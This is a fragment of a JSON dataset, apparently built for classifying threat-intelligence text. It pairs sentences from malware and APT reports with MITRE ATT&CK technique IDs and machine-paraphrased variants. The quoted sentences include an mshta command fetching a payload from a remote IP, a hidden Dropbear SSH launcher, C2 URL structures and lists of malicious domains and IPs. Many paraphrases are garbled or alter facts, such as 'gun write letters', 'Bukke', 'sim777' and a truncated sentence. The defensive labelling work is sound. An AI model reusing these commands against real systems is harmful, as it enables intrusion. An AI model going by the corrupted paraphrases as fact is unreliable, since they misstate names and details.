    "The backdoor has the capability to download and upload files, execute shell commands, and update its configuration.": [],
    "BUGJUICE is a backdoor that is executed by launching a benign file and then hijacking the search order to load a malicious dll into it": [
        {
            "tec_id": "T1574.001",
            "en_text": "BUGJUICE is a backdoor that is executed by launching a benign file and then hijacking the search order to load a malicious dll into it",
            "data_text": "BUGJUICE is a back door that is executed by running a benign file and then capturing the search order to load malicious dll into it"
        }
    ],
    "This most likely means there is some type of DLL hijacking going on by distributing a legitimate McAfee binary with MirageFox to load up the DLL properly into a legitimate looking process": [],
    "Whitefly has consistently used a technique known as search order hijacking to run Vcrodat.": [],
    "Attackers can therefore give a malicious DLL the same name as a legitimate DLL but place it ahead of the legitimate version in the search order so that it will be loaded when Windows searches for it.": [],
    "Nibatad is also a loader that leverages search order hijacking, and downloads an encrypted payload to the infected computer.": [],
    "BUGJUICE defaults to TCP using a custom binary protocol to communicate with the C2, but can also use HTTP and HTTPs if directed by the C2": [],
    "SNUGRIDE is a backdoor that communicates with its C2 server through HTTP requests": [],
    "We mentioned earlier that due to the nature of the IE injection technique used by the HTTP-based backdoors, a number of C2 commands were cached to disk": [],
    "And, according to the collected config files, the group upgraded their malware communications from plain text http to encrypted https in October 2013": [
        {
            "tec_id": "T1071",
            "en_text": "And, according to the collected config files, the group upgraded their malware communications from plain text http to encrypted https in October 2013",
            "data_text": "And, according to the collected configuration files, the group improved its messages from plain text http to encrypted https in October 2013."
        }
    ],
    "Figure 1: Configuration file that adds new C2 server and forces the data-stealing backdoor to use it   Figure 2: Configuration file that adds TCP tunnels and records desktop video Command and Control CARBANAK communicates to its C2 servers via pseudo-HTTP or a custom binary protocol": [],
    "Pseudo-HTTP Protocol Messages for the pseudo-HTTP protocol are delimited with the ‘|’ character": [],
    "We recently mentioned this tool in another report on April 16, as this variant of the BONDUPDATER tool used DNS tunneling to communicate with its C2, specifically using TXT queries to receive information from the C2 server": [],
    "Server Command and control server that communicates via DNS tunneling   Panel Graphical User Interface that allows actors to issue commands, upload and download files to Agents via the Server    Table 2": [],
    "The Poison Frog server handles both the HTTP and DNS tunneling channels used by the hUpdater.ps1 and dUpdater.ps1 scripts": [
        {
            "tec_id": "T1071",
            "en_text": "The Poison Frog server handles both the HTTP and DNS tunneling channels used by the hUpdater.ps1 and dUpdater.ps1 scripts",
            "data_text": "The Poison Frog server processes HTTP and DNS tunneling of the channels used by the hUpdater.ps1 and dUpdater.ps1 scripts."
        }
    ],
    "Its C2 is based on IIS using .asp technology to handle the victims’ HTTP requests": [],
    "The example C2s used by older variants of Comnie demonstrates this:  Figure 9 Old Comnie variants collecting C2 information Please refer to the Appendix for a script that may be used to decode C2 information from the older Comnie variants": [
        {
            "tec_id": "T1071",
            "en_text": "The example C2s used by older variants of Comnie demonstrates this:  Figure 9 Old Comnie variants collecting C2 information Please refer to the Appendix for a script that may be used to decode C2 information from the older Comnie variants",
            "data_text": "The example of C2s used by older Comnie variants demonstrates this: Figure 9 Old Comnie variants collect information about C2 Please refer to the Script Application that can be used to decode C2 information from older Comnie versions"
        }
    ],
    "After Comnie collects the remote C2 information, it will communicate with these remote servers using HTTP requests": [],
    "The URIs used in the HTTP requests are randomly generated": [],
    "Table 2 Sandbox evasion checks in the C# variant of RogueRobin Like the original version, the C# variant of RogueRobin uses DNS tunneling to communicate with its C2 server using a variety of different DNS query types": [],
    "Figure 2 Code that issues DNS query to gogle.co if a debugger is detected All DNS requests issued by RogueRobin use the built in nslookup.exe application to communicate to the C2 server and the Trojan will use a variety of regular expressions to extract data from the DNS response": [],
    "Character  Digit   h 0   i 1   j 2   k 3   l 4   m 5   n 6   o 7   p 8   q 9    Table 4 Character substitution used in RogueRobin The Trojan will use future DNS requests to retrieve jobs from the C2 server, which the Trojan will handle as commands": [],
    "The x_mode command is disabled by default, but when enabled via a command received from the DNS tunneling channel, it allows RogueRobin to receive a unique identifier and to get jobs by using Google Drive API requests": [],
    "Background From October 2012 to May 2014, FireEye observed APT12 utilizing RIPTIDE, a proxy-aware backdoor that communicates via HTTP to a hard-coded command and control (C2) server": [],
    "If you compare the HTTP GET request from the RIPTIDE samples (Figure 1) to the HTTP GET request from the HIGHTIDE samples (Figure 3) you can see the malware author changed the following items:  User Agent Format and structure of the HTTP Uniform Resource Identifier (URI)   Figure 3: HIGHTIDE GET Request Example Similar to RIPTIDE campaigns, APT12 infects target systems with HIGHTIDE using a Microsoft Word (.doc) document that exploits CVE-2012-0158": [],
    "Similar to RIPTIDE and HIGHTIDE, the WATERSPOUT backdoor is an HTTP-based backdoor that communicates with its C2 server": [],
    "11/1/18 sahro.bella7 trala.cosh2 Bishtr.cam47 Lobrek.chizh Cervot.woprov    Table 5 Gathered C# Cannon samples As mentioned in our initial blog, the actor controlled email address acting as the C2 was sahro.bella7[at]post.cz, but all previous samples of Cannon used sym777.g[at]post.cz": [
        {
            "tec_id": "T1071",
            "en_text": "11/1/18 sahro.bella7 trala.cosh2 Bishtr.cam47 Lobrek.chizh Cervot.woprov    Table 5 Gathered C# Cannon samples As mentioned in our initial blog, the actor controlled email address acting as the C2 was sahro.bella7[at]post.cz, but all previous samples of Cannon used sym777.g[at]post.cz",
            "data_text": "11/1/18 sahro.bella7 trala.cosh2 Bishtr.cam47 Lobrek.chizh Cervot.woprov Table 5 Collected samples C# Cannon As mentioned in our original blog, the actor controlled the email address acting as C2 was sahro.bella7[at]post.cz, but all previous samples Cannon used sim777.g[at]post.cz"
        }
    ],
    "Even though Delphi Cannon uses POP3S and SMTPS for its C2 communications like Cannon, it is arguably easier to defend against as it uses an actor owned domain that defenders can easily block and not a legitimate email provider such as Seznam": [],
    "The screenshot in Figure 8 of the inf method within a Cannon sample (SHA256: 4405cfbf28…) shows the information gathered that is exfiltrated to the C2 via email, specifically with RunningPlace and LogicalDrives header strings:  Figure 8 inf method used by Cannon When comparing the two Cannon variants, we found a method within a Delphi Cannon sample (SHA256: 5a02d4e5f6…) showing the use of Running place and Logical_Drivers as header strings to the system information it is collecting and sending to the C2 via email": [],
    "The shellcode retrieves an additional payload by connecting to the following C2 server using DNS: aaa.stage.14919005.www1.proslr3[.]com Once a successful reply is received from the command and control (C2) server, the PowerShell script executes the embedded Cobalt Strike shellcode": [],
    "Later variants upload the file to a web server via an HTTP post command": [],
    "Retriever uses .NET web services and the SoapHttpClientProtocol class to communicate with its C2 server, which generates HTTP requests resembling the example request in Figure 4": [],
    "The shellcode executed by this command is the same as in the delivery documents as well, specifically taken from Metasploit to obtain additional shellcode to execute using an HTTP request to the following URL: http://www7.chrome-up[.]date/0m5EE We are unsure of the shellcode hosted at this URL, as we were unable to coerce the C2 server to provide a payload": [],
    "Once these variables are set, the malware uses the SoapHttpClientProtocol class to communicate with its C2 server, which issues an HTTP POST requests that appears as:  As you can see from the above request, the SoapHttpClientProtocol class neatly structures data into an HTTP POST request": [],
    "All subsequent interaction with the C2 server uses the same SOAP web service, so we will not show all of the generated HTTP requests": [],
    "Figure 9: Command logs after execution Network Communications FELIXROOT communicates with its C2 via HTTP and HTTPS POST protocols": [],
    "Table 3: FELIXROOT backdoor parameters  Cryptography All data is transferred to C2 servers using AES encryption and the IbindCtx COM interface using HTTP or HTTPS protocol": [],
    "Previous related research: https://sec0wn.blogspot.com/2018/05/clearing-muddywater-analysis-of-new.html?m=1 https://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/ https://blog.malwarebytes.com/threat-analysis/2017/09/elaborate-scripting-fu-used-in-espionage-attack-against-saudi-arabia-government_entity/ https://www.sekoia.fr/blog/falling-on-muddywater/  Decoy images by country Jordan     The Hashemite Kingdom of Jordan, Ministry of Justice (mwjo.doc) DAMAMAX.doc    Turkey     Turkey’s General Directorate of Security Turkey’s Directorate General of Coastal Safety        Turkey’s General Directorate of Security (Onemli Rapor.doc) Turkey’s Ministry of the Interior (Early election.doc)    Saudi Arabia Document signed by the Major General Pilot, commander of the Saudi Royal Air Force     KSA King Saud University (KSU) KSA King Saud University (KSU)    Azerbaijan İnkişaf üçün görüş.doc (meeting for development) Iraq     Iraqi Ministry of Foreign Affairs Government of Iraq, the Treasury of the Council of Ministers    Pakistan     ECP.doc National Assembly of Pakistan.doc        P.Police.doc     Afghanistan President.doc, E-government of Afghanistan Technical details Below is a description of the malware extraction and execution flow, starting from the initial infection vector, running VBA code via a macro and then dropping the PowerShell code that establishes command-center communications, sends victim system information and then receives commands supported by the malware": [],
    "http://www.cankayasrc[.]com/style/js/main.php http://ektamservis[.]com/includes/main.php http://gtme[.]ae/font-awesome/css/main.php  Recommendations for organizations Effective protection from targeted attacks focuses on advanced detective, preventive and investigative capabilities via solutions and training, allowing an organization to control any activities on their network or suspicious files on user systems": [],
    "This information can then be transmitted to the attacker using protocols such as FTP, HTTP, and SMTP": [],
    "tfvn[.]com[.]vnshirkeswitch[.]netguideofgeorgia[.]orggulfclouds[.]sitejhssourcingltd[.]comkamagra4uk[.]compioneerfitting[.]compositronicsindia[.]comscseguros[.]ptspldernet[.]comtoshioco[.]comwww[.]happytohelpyou[.]inIP addressesThe following IP addresses have been observed to be associated with malware campaigns.112.213.89[.]4067.23.254[.]6162.212.33[.]98153.92.5[.]124185.117.22[.]19723.94.188[.]24667.23.254[.]17072.52.150[.]218148.66.136[.]62107.180.24[.]253108.179.246[.]13818.221.35[.]21494.46.15[.]20066.23.237[.]18672.52.150[.]218URLs:The following URLs have been observed to be associated with malware campaigns.https[:]//a[.]pomf[.]cat/http[:]//pomf[.]cat/upload[.]php": [],
    "The initial DNS query sent by the payload to obtain the system specific identifier uses the following structure, which includes the current process identifier (PID) as the subdomain of the C2 domain: <current process id>.<c2 domain> The C2 server will provide the system specific identifier within the answer portion of the DNS response": [],
    "The following shows the specific IP addresses or strings used by the C2 to transmit a success or cancel message depending on the type of DNS query used for C2 communications:    DNS Type Successful Cancel   A,AC 1.1.1.\\d+ 1.2.9.\\d+   AAAA 2a00:: 2200::   CNAME,MX,TXT,SRV,SOA ok cancel    After providing system specific information, the payload will Interact with the C2 server to obtain commands, which the payload refers to as jobs": [],
    "To obtain strings to treat as commands, the payload will issue a series of DNS queries to resolve domains with the following structure: <system id>-<job ID>-<offset data specific to job>.<c2 domain> The C2 server will provide responses to these queries that contain answers in IPv4 or IPv6 addresses depending on the type of DNS query the payload uses to communicate with its C2 server": [],
    "This command will automatically set the DNS type to use for actual C2   $showconfig Uploads the current configuration of the payload to the C2   slpx:\\d+ Sets the sleep interval between outbound DNS requests   $fileUpload Downloads contents from the C2 server and writes them to a specified file    Table 3 Commands available to payload Campaign Analysis The following domains are configured within the payload to be used as C2s": [],
    "For instance, the downloader will first attempt to communicate with its C2 server using an HTTPS request": [],
    "If that HTTPS request is not successful, the downloader will issue an HTTP request": [],
    "Lastly, if the HTTP request is not successful, the downloader will fallback to using DNS tunneling to establish communications": [],
    "If both attempts fail and the payload is unable to obtain a session ID and pre-shared key via HTTP or HTTPS, it will try to use DNS tunneling": [],
    "It does so using either the HTTPS/HTTP or DNS channels, depending on which method is successful": [],
    "The payload will construct a message that has the following structure that it will then send to the C2:   bye<char uuid[35]>d   The message above is sent via a simple HTTPS/HTTP POST request to the C2 server": [],
    "As seen in the above request, the Trojan will generate a URL for its beacon with the following structure:http://<c2 domain>/chk?<hex(Environment.UserName/Environment.MachineName)> The Trojan will issue a request to this URL to check (hence the chk string in the URL) to see if the C2 server has a command for the Trojan to run": [],
    "The Trojan will then read the hexadecimal formatted contents of this file in 1500 byte blocks, sending each 1500 bytes of data from the file to the C2 server via an HTTP GET request to a URL with the following structure:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(command prompt output)> The upload command (2) writes data provided by the C2 to a specified file": [],
    "[1] https://www.clearskysec.com/report-the-copykittens-are-targeting-israelis/ [2] https://www.clearskysec.com/copykitten-jpost/": [],
    "After the C2 information has been collected, BADNEWS leverages HTTP for communication with the remote servers": [],
    "33 Download specified file to %TEMP%\\up and execute it in a new process      During C2 communications, BADNEWS will communicate to the C2 previously identified via HTTP": [],
    "Exfiltrate data using HTTP over HTTP over AES over XOR, or any combination of the available transports": [],
    "Deep Discovery Inspector protects customers from these threats via this DDI Rule:  DDI Rule 18 : DNS response of a queried malware Command and Control domain DDI Rule 15 : Many unsuccessful logon attempts (nbt_scan.exe) DDI Rule 38 : Multiple unsuccessful logon attempts (nbt_scan.exe)  TippingPoint customers are protected from these threats via these ThreatDV filters:  27218: HTTP: TROJ_RATANKBA_A Checkin 28219: HTTP: TROJ_RATANKBA_A Checkin 02 27220: HTTPS: TROJ_RATANKBA_A Checkin 27221: HTTP: Sundown EK Flash Exploit (SWF_EXPLOYT.YYRQ)  A list of related Indicators of Compromise (IoCs) can be found in this appendix": [],
    "IcedCoffee is a fairly basic backdoor which uses WMI to collect a variety of system and user information from the system, which is then encoded with base64, encrypted with RC4 and submitted via HTTP POST to the C2 server": [],
    "It then calls the subfunction with the argument of 2 to get the string that it will use as the HTTP POST request": [],
    "The resulting HTTP POST request looks like the following: POST http://185.25.50[.]93/syshelp/kd8812u/protocol.php HTTP/1.1 Host: 185.25.50[.]93 Content-Type: application/x-www-form-urlencoded Content-Length: 21 porg=44908AE0524f422d We have not seen a C2 server respond to our requests during our analysis, however, we do know how the Trojan will parse the C2’s response for specific data": [],
    "We have seen the following HTTP POST parameters within the Zebrocy C++ samples: porg structOne oq volume DDE Details The author of the DDE document used in the February 2018 attacks used some obfuscation techniques in an attempt to evade detection": [],
    "Victim Registration SpeakUp uses POST and GET requests over HTTP to communicate with its main C&C which is the compromised website of speakupomaha[.]com": [],
    "It uses the legitimate Naver email platform in order to communicate with the attackers via email": [],
    "Command & Control  The malware communicates with the Naver email platform in order to communicate with the operator": [
        {
            "tec_id": "T1071",
            "en_text": "Command & Control  The malware communicates with the Naver email platform in order to communicate with the operator",
            "data_text": "Malware team and management interacts with Naver's electronic platform to communicate with the operator"
        }
    ],
    "It communicates with ftp.bytehost31[.]org via FTP for command and control (C2)": [],
    "Domains  http://mdzz2019.noip[.]cn:19931 http://mdzz2019.noip[.]cn:3654/  From my analyses, I was able to identify http://mdzz2019.noip[.]cn:19931 as its main C2 url.  This is a dynamic DNS, meaning the actual IP changes quite frequently": [],
    "XAgent uses HTTP requests to communicate with its C2 servers, which allows the threat actor to interact with the compromised system": [],
    "The Trojan uses HTTP POST requests, as seen in Figure 1 to send data to the C2 server, and GET requests to receive commands from the server, as seen in Figure 2": [],
    "Figure 1 XAgent macOS HTTP POST request  Figure 2 XAgent mscOS HTTP GET request The C2 URLs generated by XAgentOSX are very similar to those created by its Windows-based counterpart": [],
    "Figure 3 Hardware ID used by XAgent to uniquely identify compromised hosts When generating the URLs within the HTTP POST and GET requests, XAgent sets one HTTP parameter using a specific data structure that contains this agent_id value": [],
    "For instance, when using this string we observed DNS queries for “apple-search.infoclose”, as the string “close” was supposed to be the next portion of the C2 URL": [
        {
            "tec_id": "T1071",
            "en_text": "For instance, when using this string we observed DNS queries for “apple-search.infoclose”, as the string “close” was supposed to be the next portion of the C2 URL",
            "data_text": "For example, when using this string, we observed DNS queries for \"apple-search.infoclease\" because the string \"close\" was to be the next part of the C2 URL."
        }
    ],
    "it operates over DNS traffic, but can also switch to encrypted channels such as HTTPS or SSL": [],
    "HAWKBALL is a backdoor that communicates to a single hard-coded C2 server using HTTP": [],
    "The malware sends an HTTP GET request to its C2 IP address using HTTP over port 443": [],
    "Persistence is maintained through a Run registry key": [],
    "In the order to run the SSH server, the attackers created a VBS file with the following content: Set WshShell = CreateObject(“WScript.Shell”) WshShell.CurrentDirectory = “C:\\WINDOWS\\TEMP\\Dropbear\\” WshShell.Run “dropbear.exe -r rsa -d dss -a -p 6789”, 0, false As is evident here, the SSH server will accept connections on port number 6789": [],
    "This marker indicates the presence of an encrypted MZ marker in the .hwp file and is decrypted by the malware and written to the Startup folder for the user:  C:\\Documents and Settings\\<username>\\Start Menu\\Programs\\Startup\\viso.exe  This step establishes the persistence of the malware across reboots on the endpoint Once the decrypted MZ marker is written to the Startup folder, the 2.hwp is deleted from the endpoint  The malware might perform this activity for a couple of reasons:  Establish persistence for itself on the endpoint Establish persistence of another component of the malware on the endpoint Update itself on endpoint after a separate updater component downloads the update from the control server  The malware has limited reconnaissance and data-gathering capabilities and is not full-fledged spyware": [],
    "Finally, the first DLL adds the registry key “SysRat,” at SoftWare\\Microsoft\\Windows\\CurrentVersion\\Run, to ensure the malware is executed at startup": [],
    "The two variants of MPK share the same registry key that the Trojan uses to automatically run each time the system starts, specifically: [HKLM and HKCU]\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\explorer Both MPK variants include key loggers that are extremely similar in functionality in addition to having the same strings used for headers within the key log file": [],
    "The RunAtLoad key will command launchd to run the daemon when the operating system starts up, while the KeepAlive key will command launchd to let the process run indefinitely": [],
    "The embedded VBScript is retrieved from a resource and decrypted using the same algorithm as discussed above, which results in the following cleartext:       set objshell = createobject(\\\"wscript.shell\\\")objshell.run \\\"mshta hxxp://86.106.131.177:6500/zIZFh\\\",vbhide     The Koadic C2 server will respond to this request with Javascript code that acts as the Koadic staging payload, which allows the actor to run additional Koadic modules on the end system to carry out their post-exploitation activities": [],
    "NavRAT then creates a registry key in order to execute this file copy at the next reboot of the system, an initial method of persistence": [],
    "Once the user clicks on the fake Adobe Flash Player installer, it will extract/create the following malicious payload into the Startup directory to maintain its persistence:": [],
    "Register the RUN key in the registry below, so that the VBS file is executed every time the machine starts": [],
    "A new registry entry is created at HKEY_CURRENT_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Graphics with a value of “C:\\ ProgramData \\ Initech \\Initech.exe” /run.": [],
    "When each file is encrypted, registry keys are created under HKU\\{SID}\\Software\\Microsoft\\ RestartManager \\ which are used to track metadata pertaining to the file being encrypted, such as owner, sequence, session and file hash": [],
    "APT10 spear phishes have been relatively unsophisticated, leveraging .lnk files within archives, files with double extensions (e.g": [],
    "The .lnk file extracted from the .7zip file": [],
    "When the .lnk file is initialized, it spawns a CMD process": [],
    "We have covered recent FIN7 activity in previous public blog posts:   FIN7 Spear Phishing Campaign Targets Personnel Involved in SEC Filings  FIN7 Evolution and the Phishing LNK  To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence  The FireEye iSIGHT Intelligence MySIGHT Portal contains additional information on our investigations and observations into FIN7 activity": [],
    "The .zip archive attached to the email contains a Windows shortcut (.lnk) file with the Microsoft Internet Explorer logo": [],
    "Clicking on the shortcut ultimately leads to Backdoor.Pirpi being downloaded and executed on the affected computer": [],
    "Comnie is able to achieve persistence via a .lnk file that is stored within the victim’s startup path": [],
    "Additionally, in the event Kaspersky is detected, the malware will immediately run the ‘Conime.lnk’ shortcut file in a new process after it is created": [],
    "The script saves the decoded and decompressed executable to %APPDATA%\\Microsoft\\Windows\\Templates\\WindowsTemplate.exe and creates an LNK shortcut at %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrive.lnk to persistently run WindowsTemplate.exe each time Windows starts up": [],
    "This round of FIN7 phishing lures implements hidden shortcut files (LNK files) to initiate the infection and VBScript functionality launched by mshta.exe to infect the victim": [],
    "In this ongoing campaign, FIN7 is targeting organizations with spear phishing emails containing either a malicious DOCX or RTF file – two versions of the same LNK file and VBScript technique": [],
    "This spawns the hidden embedded malicious LNK file in the document": [],
    "Figure 3: FIN7 phishing lure persistence mechanisms Examining Attacker Shortcut Files In many cases, attacker-created LNK files can reveal valuable information about the attacker’s development environment": [
        {
            "tec_id": "T1547.009",
            "en_text": "Figure 3: FIN7 phishing lure persistence mechanisms Examining Attacker Shortcut Files In many cases, attacker-created LNK files can reveal valuable information about the attacker’s development environment",
            "data_text": "Figure 3: Persistence mechanism of phishing bait FIN7 Attack File Investigation Shortcut In many cases, attacker-created LNK files can reveal valuable information about the attacker's development environment."
        }
    ],
    "These files can be parsed with lnk-parser to extract all contents": [
        {
            "tec_id": "T1547.009",
            "en_text": "These files can be parsed with lnk-parser to extract all contents",
            "data_text": "These files can be parsed using Ink-parser to extract all content"
        }
    ],
    "LNK files have been valuable during Mandiant incident response investigations as they include volume serial number, NetBIOS name, and MAC address": [],
    "If this file exists, the content is read in order to obtain a path to find a second file with the LNK (link) extension": [],
    "The LNK file is finally used to identify a third file: a ZIP file": [],
    "When it is executed, it creates two files: an LNK file that points to %system32%\\rundll32.exe, and the FELIXROOT loader component": [],
    "The LNK file is moved to the startup directory": [],
    "This file is then copied to a filename of ‘Windows Update.lnk’, which is placed in the startup path previously identified": [
        {
            "tec_id": "T1547.009",
            "en_text": "This file is then copied to a filename of ‘Windows Update.lnk’, which is placed in the startup path previously identified",
            "data_text": "This file is then copied to the file name 'Windows Update.Ink', which is placed in the startup path previously identified"
        }
    ],
    "This shortcut file points to the path of the previously written ‘Applet.cpl’ file": [],
    "Finally, Reaver.v1 will execute the ‘~WUpdate.lnk’ file in a new process, thus loading the recently dropped malicious CPL file": [],
    "This shortcut file points to the path of the previously written ‘winhelp.cpl’ file": [],
    "Finally, Reaver.v2 will execute the ‘~Update.lnk’ file in a new process, thus loading the recently dropped malicious CPL file": [],
    "This shortcut file calls the built-in ‘control.exe’ utility to in turn load the previously dropped malicious CPL file of ‘winhelp.cpl’": [],
    "In this campaign the KopiLuwak backdoor was encoded and delivered in a Windows shortcut (.lnk) file": [],
    "The lnk files were an especially interesting development because the powershell code they contain for decoding and dropping the payload is nearly identical to that utilized by the Zebrocy threat actor a month earlier": [],
    "Using Windows Shortcut files (.lnk) in the Startup folder that invoke the Windows Scripting Host (wscript.exe) to execute a Jscript backdoor for persistence": [],
    "When the Trojan runs as an executable within the “DsvHelper” folder, the Trojan will create a shortcut (.lnk file) and save the shortcut to the ‘DsvHelper’ folder": [],
    "2 Successful payload download Astaroth’s initial payload is a malicious .lnk file, a common delivery method used by threat actors": [],
    "Malicious .lnk files contain a link to a URL (instead of the expected local URI) to grab the next payload": [],
    "In the case of Astaroth trojan, the .lnk file contains an argument into WMIC.exe to run in non-interactive mode, which forgoes opening a window that the victim could notice, to download the hardcoded url in the .lnk": [],
    "The tactic also serves to mask malicious C2 and exfiltration traffic and make it appear innocuous": [],
    "Encoded Payload   Decoded Payload     MD5   Size   Import Hash   Exported Function   Version    aa3f303c3319b14b4829fe2faa5999c1  322164  182ee99b4f0803628c30411b1faa9992  l7MF25T96n45qOGWX  5.3.2    126067d634d94c45084cbe1d9873d895  330804  5f45532f947501cf024d84c36e3a19a1  hJvTJcdAU3mNkuvGGq7L  5.4.1    fce54b4886cac5c61eda1e7605483ca3  345812  c1942a0ca397b627019dace26eca78d8  WcuH  5.4.1    Table 2: Static characteristics of UPPERCUT Another new feature in the latest UPPERCUT sample is that the malware sends an error code in the Cookie header if it fails to receive the HTTP response from the command and control (C2) server": [],
    "Another difference in the network traffic generated from the malware is that the encoded proxy information has been added in the URL query values during the C2 communication": [],
    "The communication and exfiltration of data was detected in a real-world scenario using the Cybereason platform": [],
    "The encoded payload is then made to look like a URI by having a random number of ‘/’ characters inserted at random locations within the encoded payload": [],
    "McAfee ATR has now discovered additional implants that are part of an operation to gain persistence for continued data exfiltration and for targeted access": [],
    "The optional HTTP data with king.jpg looks like a beacon to inform the control server that the malware is ready to accept new commands:  Commands received from the control server are encoded DWORDs After decoding, these DWORDs should be in the range 123459h to 123490h  Malware checking to make sure a received command is in the correct range": [],
    "If the size is 7 bytes or more, the backdoor verifies that the command and control server sent an encoded package": [],
    "The generated buffer is encoded using the BASE64 alphabet to be sent in the POST request": [],
    "The DropIt Trojan we analyzed is an executable that builds an embedded executable by decoding embedded blobs of base64 encoded data and concatenating them together in the correct order": [],
    "It then sends the following IRC commands: NICK bxphzrjbxp USER bxphzrjbxp bxphzrjbxp bxphzrjbxp bxphzrjbxp To make sure it connected to the correct server, the Trojan checks for the message sent from the IRC server after the bot connects: Welcome to the MpkNet IRC Network The MPK bot does not join a specific IRC channel, instead sending private messages (PRIVMSG) to a user with the nick “mpk”": [],
    "In response to this request, the C2 server responds with a Base64-encoded RSA public key (seen in Figure 12)": [],
    "Data that is sent is compressed and then base64-encoded before being included in the requests": [
        {
            "tec_id": "T1132",
            "en_text": "Data that is sent is compressed and then base64-encoded before being included in the requests",
            "data_text": "Data that is sent, compressed, and then encoded in base64 before being included in requests"
        }
    ],
    "The C2 server sends back Base64 encoded response": [
        {
            "tec_id": "T1132",
            "en_text": "The C2 server sends back Base64 encoded response",
            "data_text": "The C2 server sends back a reply encoded in Base64"
        }
    ],
    "The script gathers system specific data, such as the domain the system belongs to and the current username, that it constructs in the following format:   <domain>\\<username>:pass   The above string is encoded using a custom base64 encoder to strip out non-alphanumeric characters (=, / and +) from the data and replaces them with domain safe values (01, 02 and 03 respectively)": [
        {
            "tec_id": "T1132",
            "en_text": "The script gathers system specific data, such as the domain the system belongs to and the current username, that it constructs in the following format:   <domain>\\<username>:pass   The above string is encoded using a custom base64 encoder to strip out non-alphanumeric characters (=, / and +) from the data and replaces them with domain safe values (01, 02 and 03 respectively)",
            "data_text": "The script collects system data, such as the domain to which the system belongs and the current username it builds in the following format: <domain>\\<username>:pass.01, 02 and 03 respectively)"
        }
    ],
    "A notable characteristic of CopyKittens is the use of DNS for command and control communication (C&C) and for data exfiltration": [
        {
            "tec_id": "T1132",
            "en_text": "A notable characteristic of CopyKittens is the use of DNS for command and control communication (C&C) and for data exfiltration",
            "data_text": "A remarkable feature of CopyKittens is the use of DNS for command and control communication (CDP)."
        }
    ],
    "Note: CTU researchers frequently observe threat actors renaming archiving tools and storing data for exfiltration in uncommon directories": [
        {
            "tec_id": "T1132",
            "en_text": "Note: CTU researchers frequently observe threat actors renaming archiving tools and storing data for exfiltration in uncommon directories",
            "data_text": "Note: CTU researchers often observe how threat actors rename archiving tools and store data for exfiltration in non-standard directories."
        }
    ],
    "This encoded information then gets an additional header added and sent across the network.": [
        {
            "tec_id": "T1132",
            "en_text": "This encoded information then gets an additional header added and sent across the network.",
            "data_text": "This encoded information then receives an additional header added and sent over the network."
        }
    ],
    "Once the host-based enumeration information was obtained, it was base64-encoded and then appended to the URL post request to a C2, whereas in previous versions this information was written to a text file.": [
        {
            "tec_id": "T1132",
            "en_text": "Once the host-based enumeration information was obtained, it was base64-encoded and then appended to the URL post request to a C2, whereas in previous versions this information was written to a text file.",
            "data_text": "After receiving host-based enumeration information, it was encoded in base64 and then appended to the request by mail URL to C2, whereas in previous versions this information was written to a text file."
        }
    ],
    "Attack Overview The attack starts with Microsoft Word documents containing a malicious VBA macro being attached to spear phishing emails": [
        {
            "tec_id": "T1566.001",
            "en_text": "Attack Overview The attack starts with Microsoft Word documents containing a malicious VBA macro being attached to spear phishing emails",
            "data_text": "The attack begins with Microsoft Word documents containing a malicious VBA macro attached to the spear phishing messages"
        }
    ],
    "The actor has used several notable techniques in these incidents such as sniffing passwords from Wi-Fi traffic, poisoning the NetBIOS Name Service, and spreading laterally via the EternalBlue exploit.  APT28 Uses Malicious Document to Target Hospitality Industry FireEye has uncovered a malicious document sent in spear phishing emails to multiple companies in the hospitality industry, including hotels in at least seven European countries and one Middle Eastern country in early July": [
        {
            "tec_id": "T1566.001",
            "en_text": "The actor has used several notable techniques in these incidents such as sniffing passwords from Wi-Fi traffic, poisoning the NetBIOS Name Service, and spreading laterally via the EternalBlue exploit.  APT28 Uses Malicious Document to Target Hospitality Industry FireEye has uncovered a malicious document sent in spear phishing emails to multiple companies in the hospitality industry, including hotels in at least seven European countries and one Middle Eastern country in early July",
            "data_text": "The actor used several well-known methods in these incidents, such as snooping passwords from Wi-Fi traffic, poisoning NetBIOS Name Service, and spreading behind through EternalBlue. APT28 uses harmful documents for the target hospitality industry FireEye discovered a malicious document sent to a gun write letters to several companies in the hospitality industry, including hotels in at least seven European countries and one Middle Eastern country in early July"
        }
    ],
    "Initial Compromise For initial compromise, FireEye Intelligence has observed APT39 leverage spear phishing emails with malicious attachments and/or hyperlinks typically resulting in a POWBAT infection": [
        {
            "tec_id": "T1566.001",
            "en_text": "Initial Compromise For initial compromise, FireEye Intelligence has observed APT39 leverage spear phishing emails with malicious attachments and/or hyperlinks typically resulting in a POWBAT infection",
            "data_text": "Initial compromise For the initial compromise, FireEye Intelligence observed APT39 levers from malicious attachments and/or hyperlinks, usually leading to POWBAT infection"
        }
    ],
    "Malware Delivery Method  In all emails sent to these government officials, the actor used the same attachment: a malicious Microsoft Word document that exploited the CVE-2012-0158 vulnerability to drop a malicious payload": [
        {
            "tec_id": "T1566.001",
            "en_text": "Malware Delivery Method  In all emails sent to these government officials, the actor used the same attachment: a malicious Microsoft Word document that exploited the CVE-2012-0158 vulnerability to drop a malicious payload",
            "data_text": "Malware Delivery Method In all messages sent to these public officials, the actor used the same information attached to it: a Microsoft Word malicious document that exploited the CVE-2012-0158 vulnerability to remove malicious payload."
        }
    ],
    "Figure 1: Contents of the Email A review of the email header data from the spear phishing messages showed that the threat actors sent the emails using the same infrastructure they have used in the past": [
        {
            "tec_id": "T1566.001",
            "en_text": "Figure 1: Contents of the Email A review of the email header data from the spear phishing messages showed that the threat actors sent the emails using the same infrastructure they have used in the past",
            "data_text": "Figure 1: Email Content A review of the email header data from written messages showed that threat actors sent emails using the same infrastructure they used in the past."
        }
    ],
    "In at least some of these recent attacks, Buckeye used spear-phishing emails with a malicious .zip attachment": [
        {
            "tec_id": "T1566.001",
            "en_text": "In at least some of these recent attacks, Buckeye used spear-phishing emails with a malicious .zip attachment",
            "data_text": "In some of the latest attacks, Bukke used malicious .zip attachments to write letters."
        }
    ],
